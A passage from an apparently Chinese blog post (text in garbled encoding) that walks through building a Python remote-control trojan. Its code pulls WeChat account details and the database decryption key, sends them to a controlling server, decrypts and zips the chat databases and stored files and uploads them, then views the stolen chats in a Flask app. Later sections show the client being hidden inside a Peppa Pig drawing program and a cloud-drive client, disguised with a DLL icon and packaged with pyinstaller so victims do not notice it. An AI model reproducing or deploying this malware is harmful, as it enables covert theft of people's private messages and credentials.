</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    [+] ç‰ˆæœ¬: </span><span style="color:#c41a16">{</span><span style="color:#000">version</span><span style="color:#c41a16">}</span><span style="color:#c41a16">
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    [+] å¾®ä¿¡å·: </span><span style="color:#c41a16">{</span><span style="color:#000">account</span><span style="color:#c41a16">}</span><span style="color:#c41a16">
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    [+] æ‰‹æœºå·: </span><span style="color:#c41a16">{</span><span style="color:#000">mobile</span><span style="color:#c41a16">}</span><span style="color:#c41a16">
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    [+] å¾®ä¿¡å: </span><span style="color:#c41a16">{</span><span style="color:#000">name</span><span style="color:#c41a16">}</span><span style="color:#c41a16">
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    [+] é‚®ç®±: </span><span style="color:#c41a16">{</span><span style="color:#000">mail</span><span style="color:#c41a16">}</span><span style="color:#c41a16">
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    [+] å¾®ä¿¡æ•°æ®è·¯å¾„: </span><span style="color:#c41a16">{</span><span style="color:#000">file_path</span><span style="color:#c41a16">}</span><span style="color:#c41a16">
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    [+] wxid: </span><span style="color:#c41a16">{</span><span style="color:#000">wxid</span><span style="color:#c41a16">}</span><span style="color:#c41a16">
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    [+] key: </span><span style="color:#c41a16">{</span><span style="color:#000">key</span><span style="color:#c41a16">}</span><span style="color:#c41a16">
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    ================== wechat info ==================
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">content</span><span style="color:#000">.</span><span style="color:#000">encode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">return</span> <span style="color:#000">file_path</span>, <span style="color:#000">key</span>
</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214347.png" alt="è·å–å¾®ä¿¡åŸºæœ¬ä¿¡æ¯"></p>
<p>è·å–å¹¶è§£å¯†å¾®ä¿¡æ•°æ®åº“ï¼š</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">def</span> <span style="color:#000">get_wechat</span>(<span style="color:#000">conn</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#000">file_path</span>, <span style="color:#000">key</span> <span style="color:#000">=</span> <span style="color:#000">get_wechat_info</span>(<span style="color:#000">conn</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">file_path</span> <span style="color:#000">is</span> <span style="color:#a90d91">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span>
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># è·å–è§£å¯†åçš„æ•°æ®åº“è·¯å¾„</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">decrypted_path</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)<span style="color:#000">.</span><span style="color:#000">decode</span>(<span style="color:#c41a16">&#34;UTF-8&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># åˆ›å»ºè§£å¯†åçš„æ•°æ®åº“æ–‡ä»¶å¤¹</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">not</span> <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">path</span><span style="color:#000">.</span><span style="color:#000">exists</span>(<span style="color:#000">decrypted_path</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">mkdir</span>(<span style="color:#000">decrypted_path</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># è§£å¯†å¾®ä¿¡æ•°æ®åº“</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">args</span> <span style="color:#000">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#c41a16">&#34;mode&#34;</span>: <span style="color:#c41a16">&#34;decrypt&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#c41a16">&#34;key&#34;</span>: <span style="color:#000">key</span>,  <span style="color:#177500"># å¯†é’¥</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c41a16">&#34;db_path&#34;</span>: <span style="color:#000">file_path</span> <span style="color:#000">+</span> <span style="color:#c41a16">&#39;</span><span style="color:#c41a16">\\</span><span style="color:#c41a16">Msg&#39;</span>,  <span style="color:#177500"># æ•°æ®åº“è·¯å¾„</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c41a16">&#34;out_path&#34;</span>: <span style="color:#000">decrypted_path</span>  <span style="color:#177500"># è¾“å‡ºè·¯å¾„ï¼ˆå¿…é¡»æ˜¯ç›®å½•ï¼‰</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#000">batch_decrypt</span>(<span style="color:#000">args</span>[<span style="color:#c41a16">&#34;key&#34;</span>], <span style="color:#000">args</span>[<span style="color:#c41a16">&#34;db_path&#34;</span>], <span style="color:#000">args</span>[<span style="color:#c41a16">&#34;out_path&#34;</span>], <span style="color:#a90d91">False</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æ‰“åŒ…å‹ç¼©è§£å¯†åçš„æ•°æ®åº“å¹¶å‘é€åˆ°æœåŠ¡ç«¯</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">zip_file_path</span> <span style="color:#000">=</span> <span style="color:#000">decrypted_path</span> <span style="color:#000">+</span> <span style="color:#c41a16">&#39;.zip&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">zip_file_name</span> <span style="color:#000">=</span> <span style="color:#000">Path</span>(<span style="color:#000">zip_file_path</span>)<span style="color:#000">.</span><span style="color:#000">name</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">path</span><span style="color:#000">.</span><span style="color:#000">exists</span>(<span style="color:#000">zip_file_path</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">remove</span>(<span style="color:#000">zip_file_path</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">zip_dir</span>(<span style="color:#000">decrypted_path</span>, <span style="color:#000">zip_file_path</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">pwd</span> <span style="color:#000">=</span> <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">getcwd</span>()  <span style="color:#177500"># è®°å½•å½“å‰è·¯å¾„</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">chdir</span>(<span style="color:#a90d91">str</span>(<span style="color:#000">Path</span>(<span style="color:#000">decrypted_path</span>)<span style="color:#000">.</span><span style="color:#000">parent</span>))  <span style="color:#177500"># åˆ‡æ¢åˆ°çˆ¶ç›®å½•</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">get_file</span>(<span style="color:#000">conn</span>, <span style="color:#a90d91">str</span>(<span style="color:#000">zip_file_name</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">remove</span>(<span style="color:#000">zip_file_path</span>)  <span style="color:#177500"># åˆ é™¤å‹ç¼©åŒ…</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">shutil</span><span style="color:#000">.</span><span style="color:#000">rmtree</span>(<span style="color:#000">decrypted_path</span>)  <span style="color:#177500"># åˆ é™¤è§£å¯†åçš„æ•°æ®åº“æ–‡ä»¶å¤¹</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">chdir</span>(<span style="color:#000">pwd</span>)  <span style="color:#177500"># åˆ‡æ¢å›åŸè·¯å¾„</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">rev</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)  <span style="color:#177500"># æ¥æ”¶æœåŠ¡ç«¯çš„ç¡®è®¤ä¿¡æ¯</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">rev</span> <span style="color:#000">!=</span> <span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;get_db_ok&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span>
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æ‰“åŒ…å‹ç¼©FileStorageæ–‡ä»¶å¤¹å¹¶å‘é€åˆ°æœåŠ¡ç«¯</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">file_storage_path</span> <span style="color:#000">=</span> <span style="color:#000">file_path</span> <span style="color:#000">+</span> <span style="color:#c41a16">&#34;</span><span style="color:#c41a16">\\</span><span style="color:#c41a16">FileStorage&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">zip_file_path</span> <span style="color:#000">=</span> <span style="color:#000">file_storage_path</span> <span style="color:#000">+</span> <span style="color:#c41a16">&#39;.zip&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">zip_file_name</span> <span style="color:#000">=</span> <span style="color:#000">Path</span>(<span style="color:#000">zip_file_path</span>)<span style="color:#000">.</span><span style="color:#000">name</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">path</span><span style="color:#000">.</span><span style="color:#000">exists</span>(<span style="color:#000">zip_file_path</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">remove</span>(<span style="color:#000">zip_file_path</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">zip_dir</span>(<span style="color:#000">file_storage_path</span>, <span style="color:#000">zip_file_path</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">pwd</span> <span style="color:#000">=</span> <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">getcwd</span>()  <span style="color:#177500"># è®°å½•å½“å‰è·¯å¾„</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">chdir</span>(<span style="color:#000">file_path</span>)  <span style="color:#177500"># åˆ‡æ¢åˆ°çˆ¶ç›®å½•</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">get_file</span>(<span style="color:#000">conn</span>, <span style="color:#a90d91">str</span>(<span style="color:#000">zip_file_name</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">remove</span>(<span style="color:#000">zip_file_path</span>)  <span style="color:#177500"># åˆ é™¤å‹ç¼©åŒ…</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">chdir</span>(<span style="color:#000">pwd</span>)  <span style="color:#177500"># åˆ‡æ¢å›åŸè·¯å¾„</span>
</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214356.png" alt="è·å–å¾®ä¿¡èŠå¤©æ•°æ®åº“"></p>
<p>å¼€å¯flaskæœåŠ¡ï¼ŒæŸ¥çœ‹å¾®ä¿¡èŠå¤©ä¿¡æ¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">def</span> <span style="color:#000">flask_show</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æŸ¥çœ‹èŠå¤©è®°å½•</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">seg</span> <span style="color:#000">=</span> <span style="color:#a90d91">input</span>(<span style="color:#c41a16">&#39;[*] è¯·è¾“å…¥æ•°æ®åº“åˆ†æ®µå·ï¼š&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">args</span> <span style="color:#000">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#c41a16">&#34;mode&#34;</span>: <span style="color:#c41a16">&#34;dbshow&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#c41a16">&#34;msg_path&#34;</span>: <span style="color:#a90d91">str</span>(<span style="color:#000">db_path</span>) <span style="color:#000">+</span> <span style="color:#c41a16">f</span><span style="color:#c41a16">&#39;</span><span style="color:#c41a16">\\</span><span style="color:#c41a16">Multi</span><span style="color:#c41a16">\\</span><span style="color:#c41a16">de_MSG</span><span style="color:#c41a16">{</span><span style="color:#000">seg</span><span style="color:#c41a16">}</span><span style="color:#c41a16">.db&#39;</span>,  <span style="color:#177500"># è§£å¯†åçš„ MSG.db çš„è·¯å¾„</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c41a16">&#34;micro_path&#34;</span>: <span style="color:#a90d91">str</span>(<span style="color:#000">db_path</span>) <span style="color:#000">+</span> <span style="color:#c41a16">&#39;</span><span style="color:#c41a16">\\</span><span style="color:#c41a16">de_MicroMsg.db&#39;</span>,  <span style="color:#177500"># è§£å¯†åçš„ MicroMsg.db çš„è·¯å¾„</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c41a16">&#34;media_path&#34;</span>: <span style="color:#a90d91">str</span>(<span style="color:#000">db_path</span>) <span style="color:#000">+</span> <span style="color:#c41a16">f</span><span style="color:#c41a16">&#39;</span><span style="color:#c41a16">\\</span><span style="color:#c41a16">Multi</span><span style="color:#c41a16">\\</span><span style="color:#c41a16">de_MediaMSG</span><span style="color:#c41a16">{</span><span style="color:#000">seg</span><span style="color:#c41a16">}</span><span style="color:#c41a16">.db&#39;</span>,  <span style="color:#177500"># è§£å¯†åçš„ MediaMSG.db çš„è·¯å¾„</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c41a16">&#34;filestorage_path&#34;</span>: <span style="color:#000">local_file_storage_path</span> <span style="color:#000">+</span> <span style="color:#c41a16">&#34;</span><span style="color:#c41a16">\\</span><span style="color:#c41a16">FileStorage&#34;</span>  <span style="color:#177500"># æ–‡ä»¶å¤¹ FileStorage çš„è·¯å¾„ï¼ˆç”¨äºæ˜¾ç¤ºå›¾ç‰‡ï¼‰</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># å¯åŠ¨flaskæœåŠ¡</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">from</span> <span style="color:#000">flask</span> <span style="color:#a90d91">import</span> <span style="color:#000">Flask</span>, <span style="color:#000">request</span>, <span style="color:#000">jsonify</span>, <span style="color:#000">render_template</span>, <span style="color:#000">g</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">import</span> <span style="color:#000">logging</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">app</span> <span style="color:#000">=</span> <span style="color:#000">Flask</span>(<span style="color:#000">__name__</span>, <span style="color:#000">template_folder</span><span style="color:#000">=</span><span style="color:#c41a16">&#39;./show_chat/templates&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># é˜»æ­¢flaskåœ¨æ§åˆ¶å°è¾“å‡ºæ—¥å¿—</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">log</span> <span style="color:#000">=</span> <span style="color:#000">logging</span><span style="color:#000">.</span><span style="color:#000">getLogger</span>(<span style="color:#c41a16">&#39;werkzeug&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">log</span><span style="color:#000">.</span><span style="color:#000">setLevel</span>(<span style="color:#000">logging</span><span style="color:#000">.</span><span style="color:#000">ERROR</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">app</span><span style="color:#000">.</span><span style="color:#000">logger</span><span style="color:#000">.</span><span style="color:#000">setLevel</span>(<span style="color:#000">logging</span><span style="color:#000">.</span><span style="color:#000">ERROR</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">@app.before_request</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">def</span> <span style="color:#000">before_request</span>():
</span></span><span style="display:flex;"><span>        <span style="color:#000">g</span><span style="color:#000">.</span><span style="color:#000">MSG_ALL_db_path</span> <span style="color:#000">=</span> <span style="color:#000">args</span>[<span style="color:#c41a16">&#34;msg_path&#34;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#000">g</span><span style="color:#000">.</span><span style="color:#000">MicroMsg_db_path</span> <span style="color:#000">=</span> <span style="color:#000">args</span>[<span style="color:#c41a16">&#34;micro_path&#34;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#000">g</span><span style="color:#000">.</span><span style="color:#000">MediaMSG_all_db_path</span> <span style="color:#000">=</span> <span style="color:#000">args</span>[<span style="color:#c41a16">&#34;media_path&#34;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#000">g</span><span style="color:#000">.</span><span style="color:#000">FileStorage_path</span> <span style="color:#000">=</span> <span style="color:#000">args</span>[<span style="color:#c41a16">&#34;filestorage_path&#34;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#000">g</span><span style="color:#000">.</span><span style="color:#000">USER_LIST</span> <span style="color:#000">=</span> <span style="color:#000">get_user_list</span>(<span style="color:#000">args</span>[<span style="color:#c41a16">&#34;msg_path&#34;</span>], <span style="color:#000">args</span>[<span style="color:#c41a16">&#34;micro_path&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">@app.route</span>(<span style="color:#c41a16">&#39;/shutdown&#39;</span>, <span style="color:#000">methods</span><span style="color:#000">=</span>[<span style="color:#c41a16">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">def</span> <span style="color:#000">shutdown</span>():
</span></span><span style="display:flex;"><span>        <span style="color:#000">shutdown_func</span> <span style="color:#000">=</span> <span style="color:#000">request</span><span style="color:#000">.</span><span style="color:#000">environ</span><span style="color:#000">.</span><span style="color:#000">get</span>(<span style="color:#c41a16">&#39;werkzeug.server.shutdown&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">if</span> <span style="color:#000">shutdown_func</span> <span style="color:#000">is</span> <span style="color:#a90d91">None</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#a90d91">raise</span> <span style="color:#000">RuntimeError</span>(<span style="color:#c41a16">&#39;Not running with the Werkzeug Server&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#000">shutdown_func</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span> <span style="color:#c41a16">&#39;Server shutting down...&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">app</span><span style="color:#000">.</span><span style="color:#000">register_blueprint</span>(<span style="color:#000">app_show_chat</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">print</span>(<span style="color:#c41a16">&#34;[+] æŸ¥çœ‹èŠå¤©è®°å½•æœåŠ¡å¯åŠ¨åœ¨ http://127.0.0.1:5000 &#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">app</span><span style="color:#000">.</span><span style="color:#000">run</span>(<span style="color:#000">debug</span><span style="color:#000">=</span><span style="color:#a90d91">False</span>)
</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214405.png" alt="åœ¨æµè§ˆå™¨ä¸­æŸ¥çœ‹èŠå¤©è®°å½•"></p>
<h2 id="æœ¨é©¬ç¨‹åº">æœ¨é©¬ç¨‹åº</h2>
<h3 id="peppa-pig">peppa-pig</h3>
<p>å®Œæˆä¸Šé¢çš„å‡ ä¸ªåŠŸèƒ½å°±å·²ç»å…·å¤‡ç®€å•è¿œæ§æœ¨é©¬çš„ç‰¹å¾äº†ï¼Œæ¥ç€å°±æ˜¯éœ€è¦å°†è¿™ä¸ªç¨‹åºéšè—èµ·æ¥ï¼Œè®©å¯¹æ–¹å¯Ÿè§‰ä¸åˆ°è¿™ä¸ªç¨‹åºçš„å­˜åœ¨</p>
<p>æˆ‘çš„æ€è·¯æ˜¯å°†è¿™ä¸ªè¿œç¨‹æ§åˆ¶çš„ç¨‹åºéšè—åœ¨å…¶ä»–åº”ç”¨ä¸­ï¼Œå¹¶ä¸”ä»¥å¤šçº¿ç¨‹æˆ–è€…å¤šè¿›ç¨‹çš„æ–¹å¼å¼‚æ­¥çš„è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œå¹¶ä¸”åœ¨å¯¹æ–¹å…³é—­åº”ç”¨ä¹‹åï¼Œè¿™ä¸ªè¿œç¨‹ç¨‹åºä¾æ—§èƒ½åœ¨åå°è¿è¡Œ</p>
<p>é¦–å…ˆæˆ‘æ‰¾åˆ°ä¸€ä¸ªåˆ©ç”¨æµ·é¾Ÿç»˜å›¾ç»˜åˆ¶å°çŒªä½©å¥‡çš„ç¨‹åºï¼Œç¨‹åºæ˜¯ <a href="https://github.com/jackfrued/Python-100-Days">Python-100-Days</a> è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œæ¥ç€æˆ‘å°†è¿œæ§ç¨‹åºå¼•å…¥ï¼Œä»¥å¤šçº¿ç¨‹çš„æ–¹å¼å¯åŠ¨ï¼Œæœ€åå°†æ•´ä¸ªç¨‹åº<a href="https://blog.csdn.net/weixin_43804047/article/details/119704965">æ‰“åŒ…æˆexeå¯æ‰§è¡Œç¨‹åº</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203844.png" alt="ç»˜åˆ¶å°çŒªä½©å¥‡ç¨‹åº">
æ·»åŠ å¤šçº¿ç¨‹ä»£ç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">if</span> <span style="color:#000">__name__</span> <span style="color:#000">==</span> <span style="color:#c41a16">&#39;__main__&#39;</span>:  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># å¤šçº¿ç¨‹  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">t1</span> <span style="color:#000">=</span> <span style="color:#000">threading</span><span style="color:#000">.</span><span style="color:#000">Thread</span>(<span style="color:#000">target</span><span style="color:#000">=</span><span style="color:#000">peppa_pig</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#000">t2</span> <span style="color:#000">=</span> <span style="color:#000">threading</span><span style="color:#000">.</span><span style="color:#000">Thread</span>(<span style="color:#000">target</span><span style="color:#000">=</span><span style="color:#000">client_main</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#000">t1</span><span style="color:#000">.</span><span style="color:#000">start</span>()  
</span></span><span style="display:flex;"><span>    <span style="color:#000">t2</span><span style="color:#000">.</span><span style="color:#000">start</span>()  
</span></span><span style="display:flex;"><span>    <span style="color:#000">t1</span><span style="color:#000">.</span><span style="color:#000">join</span>()  
</span></span><span style="display:flex;"><span>    <span style="color:#000">t2</span><span style="color:#000">.</span><span style="color:#000">join</span>()
</span></span></code></pre></div><p>ä½¿ç”¨pyinstalleræ‰“åŒ…</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#000">pyinstaller</span> <span style="color:#000">-F</span> <span style="color:#000">-w</span> <span style="color:#000">-n</span> <span style="color:#000">pig</span> <span style="color:#000">-i</span> <span style="color:#000">icon</span>.<span style="color:#000">ico</span> <span style="color:#000">peppa_pig</span>.<span style="color:#000">py</span>
</span></span></code></pre></div><p>éœ€è¦åŠ å…¥èµ„æºæ—¶</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#000">pyinstaller</span> <span style="color:#000">-F</span> <span style="color:#000">-w</span> <span style="color:#000">-n</span> <span style="color:#000">pig</span> <span style="color:#000">-i</span> .\<span style="color:#000">icon</span>.<span style="color:#000">ico</span> -<span style="color:#000">-add-data</span>=<span style="color:#c41a16">&#34;.\assets\version_list.json;.&#34;</span> .\<span style="color:#000">peppa_pig</span>.<span style="color:#000">py</span>
</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203909.png" alt="æ‰“åŒ…æˆexeæ–‡ä»¶">
å¯¹æ–¹ç‚¹å‡»è¿è¡Œè¿™ä¸ªç¨‹åºä¹‹åï¼Œè¿œç¨‹æ§åˆ¶ç¨‹åºåŒæ—¶ä»¥çº¿ç¨‹çš„å½¢å¼è¿›è¡Œè¿è¡Œï¼Œå½“å¯¹è±¡å…³é—­ç»˜å›¾æ¡†æ—¶ï¼Œè¿œæ§ç¨‹åºçš„çº¿ç¨‹è¿˜æ˜¯ä¼šåœ¨åå°ç»§ç»­è¿è¡Œï¼Œå¯¹æ–¹åªè¦ä¸æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨æ—¶éš¾ä»¥å¯Ÿè§‰åˆ°çš„</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203930.png" alt="åœ¨åå°è¿è¡Œçš„pig.exe"></p>
<h3 id="é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯">é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯</h3>
<p>ç»“åˆä¹‹å‰å†™çš„ä¸€ä¸ª<a href="https://pi3yyy.love/archives/7c353064.html">é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯</a>çš„é¡¹ç›®ï¼Œæˆ‘ä¹Ÿå°†æœ¨é©¬å¼•å…¥</p>
<p>è¿™æ¬¡çš„å¼•å…¥æ–¹å¼åŒä¸Šé¢çš„æœ‰æ‰€ä¸åŒï¼Œç”±äºä¸Šé¢ä»¥å¤šçº¿ç¨‹çš„æ–¹å¼å¼•å…¥ï¼Œè€Œåœ¨Windowsä»»åŠ¡ç®¡ç†å™¨ä¸­åªä¼šæ˜¾ç¤ºè¿›ç¨‹ï¼Œæ‰€ä»¥è¿˜æ˜¯pig.exeçš„ç¨‹åºæ­£åœ¨è¿è¡Œï¼Œå¯¹æ–¹å®¹æ˜“å¯Ÿè§‰åˆ°</p>
<p>è¿™ä¸ªæˆ‘ä»¬æ¢ä¸ªæ€è·¯ï¼Œå…ˆå°†è¿œæ§ç¨‹åºæ‰“åŒ…æˆexeå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ›¿æ¢å…¶å›¾æ ‡ä¸ºåŠ¨æ€é“¾æ¥åº“çš„å›¾æ ‡ï¼Œå¹¶ä¸”å°†åå­—è®¾ç½®ä¸ºå¾ˆé•¿çš„ä¸€ä¸²ã€‚</p>
<p>æ¥ç€åœ¨é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯ç¨‹åºä¸­ï¼Œä»¥<font color="#00b0f0">å¤šè¿›ç¨‹</font>çš„æ–¹å¼æ‰§è¡Œè¿™ä¸ªè¿œæ§exeç¨‹åºï¼Œæœ€åå°†é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯æ‰“åŒ…æˆexeæ–‡ä»¶ï¼Œå°†è¿œæ§ç¨‹åºè—åœ¨æ‰“åŒ…åçš„ä¾èµ–æ–‡ä»¶å¤¹ä¸­</p>
<p>æ·»åŠ å¤šè¿›ç¨‹ä»£ç </p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">if</span> <span style="color:#000">__name__</span> <span style="color:#000">==</span> <span style="color:#c41a16">&#39;__main__&#39;</span>:  
</span></span><span style="display:flex;"><span>	<span style="color:#177500"># å¤šè¿›ç¨‹</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">multiprocessing</span><span style="color:#000">.</span><span style="color:#000">freeze_support</span>()  
</span></span><span style="display:flex;"><span>    <span style="color:#000">multiprocessing</span><span style="color:#000">.</span><span style="color:#000">Process</span>(<span style="color:#000">target</span><span style="color:#000">=</span><span style="color:#000">run_client</span>)<span style="color:#000">.</span><span style="color:#000">start</span>()  
</span></span><span style="display:flex;"><span>    <span style="color:#000">run</span>()
</span></span></code></pre></div><p>ä½¿ç”¨pyinstallerè¿›è¡Œæ‰“åŒ…</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#000">pyinstaller</span> <span style="color:#000">-D</span> <span style="color:#000">-w</span> <span style="color:#000">-n</span> <span style="color:#000">QE_Network_Drive</span> <span style="color:#000">-i</span> <span style="color:#000">icon</span>.<span style="color:#000">ico</span> <span style="color:#000">flet_GUI</span>.<span style="color:#000">py</span>
